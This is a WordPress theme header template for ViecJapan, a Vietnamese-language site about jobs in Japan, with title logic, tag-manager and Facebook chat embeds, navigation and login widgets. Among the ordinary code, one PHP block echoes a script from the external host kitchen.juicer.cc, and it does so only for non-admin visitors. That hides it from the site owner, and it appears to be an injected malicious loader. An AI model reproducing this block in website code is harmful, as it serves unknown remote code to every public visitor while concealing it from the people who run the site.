<!DOCTYPE HTML>
<html lang="<?php _e('[:vi]vi[:jp]jp'); ?>">
<head prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# article: http://ogp.me/ns/article#">
<meta charset="UTF-8">
  <title>
    <?php       
      if (is_search() && $_GET['company_type'])
      {
        $title = strip_tags(htmlspecialchars_decode(get_bloginfo('title')));
        if ($_GET['company_type'] == 'xkld') echo 'Công ty XKLĐ' . ' | ' . $title;
        if ($_GET['company_type'] == 'ho-tro-dang-ky') echo 'Tổ chức hỗ trợ đăng ký' . ' | ' . $title;
      }
      else bzb_title(); ?>
  </title> 
  
  <meta name="viewport" content="width=device-width,initial-scale=1.0">
  <!--[if lt IE 9]>
    <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
  <![endif]-->
<?php wp_head(); ?>

<?php //echo get_option('analytics_tracking_code');?> 
<?php //echo get_option('webmaster_tool');?>

<?php if(!is_admin()) {
  echo '<script src="//kitchen.juicer.cc/?color=WPGvbAhl06c=" async></script>';
} ?>

<!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-TK2Z76B');</script>
<!-- End Google Tag Manager -->
</head>

<body id="#top" <?php if (is_category()) : echo 'class="page-template-default page page-post-list left-content default customize-support"'; else : body_class(); endif; ?>  itemschope="itemscope" itemtype="http://schema.org/WebPage">

<!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-TK2Z76B"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->

<!-- Load Facebook SDK for JavaScript -->
<div id="fb-root"></div>
<script>
window.fbAsyncInit = function() {
FB.init({
xfbml            : true,
version          : 'v10.0'
});
};

(function(d, s, id) {
var js, fjs = d.getElementsByTagName(s)[0];
if (d.getElementById(id)) return;
js = d.createElement(s); js.id = id;
js.src = 'https://connect.facebook.net/vi_VN/sdk/xfbml.customerchat.js#xfbml=1&version=v2.12&autoLogAppEvents=1';
fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>


<!-- Your Chat Plugin code -->
<div class="fb-customerchat"
attribution=setup_tool
page_id="112134113945715"
theme_color="#0084ff">
</div>


<!--<?php //bzb_show_facebook_block(); ?>-->

<?php if( is_singular('lp') ) { ?>

<div class="lp-wrap">

<header id="lp-header">
  <h1 class="lp-title"><?php wp_title(''); ?></h1>
</header>

<?php }else{ ?>

<header id="header" role="banner" itemscope="itemscope" itemtype="http://schema.org/WPHeader">
  <div class="wrap">
    <?php echo get_custom_logo(); ?>
    <?php if( is_home() || is_front_page() ) : ?>
    <h1 class="site-heading">Trang web ViecJapan nhằm đáp ứng nhu cầu làm việc tại Nhật Bản của người nước ngoài</h1>
<?php endif; ?>
    <!-- start global nav  -->
      <?php if( has_nav_menu( 'global_nav' ) ){ ?>
        <nav id="gnav" class="main-navigation" role="navigation" itemscope="itemscope" itemtype="http://scheme.org/SiteNavigationElement">
          <div class="wrap">
          <?php
            wp_nav_menu(
              array(
                'theme_location'  => 'global_nav',
                'menu_class'      => 'clearfix',
                'menu_id'         => 'gnav-ul',
                'container'       => 'div',
                'container_id'    => 'gnav-container',
                'container_class' => 'gnav-container'
              )
            );?>
            </div>
        </nav>
        <?php } ?>

      <?php } // if is_singular('lp') ?>

    <?php 
      do_action('xeory_append_site-branding');
    ?>

      <?php if ( is_active_sidebar( 'language-widget' ) ) { ?>
      <aside id="language-widget" class="language-widget-area" role="complementary">
        <div class="wrap"><?php dynamic_sidebar( 'language-widget' ); ?></div>
      </aside><!-- #secondary --><?php } ?>

    <div class="hd-user"><img src="<?php echo get_stylesheet_directory_uri().'/images/iconmonstr-user-circle-thin.png'?>"></div>
    <div class="fua-wrap">
      <?php 
        if( !is_user_logged_in() ){
          if(function_exists('gianism_login')){
            gianism_login();
          }
        }
      ?>
      <?php if( is_user_logged_in() ){ ?>
      <p class="button-mypage"><a href="<?php echo home_url('/mypage'); ?>">Trang cá nhân</a></p>
      <?php } ?>
      <?php echo do_shortcode('[fua]'); ?> 
    </div>
  </div>
</header>


